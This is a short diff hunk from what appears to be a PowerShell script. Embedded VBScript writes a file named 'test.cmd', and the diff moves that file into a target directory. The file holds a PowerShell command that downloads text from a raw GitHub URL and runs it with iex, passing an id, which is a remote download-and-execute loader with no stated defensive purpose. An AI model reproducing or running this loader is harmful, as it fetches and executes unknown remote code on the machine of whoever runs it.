@@ -11,7 +11,7 @@ if (-not (Test-Path -Path $targetDir)) {
 }
 $vbsContent = @"
 Set fso = CreateObject("Scripting.FileSystemObject")
-path = "test.cmd"
+path = "$targetDir\test.cmd"
 
 Set file = fso.CreateTextFile(path, True)
 file.WriteLine "powershell -command ""`$asd=(iwr 'https://raw.githubusercontent.com/1CodeDev-hub/electronAI/refs/heads/main/new.txt' -UseBasicParsing ).Content; iex """"& { `$asd } -id '$id'"""""""
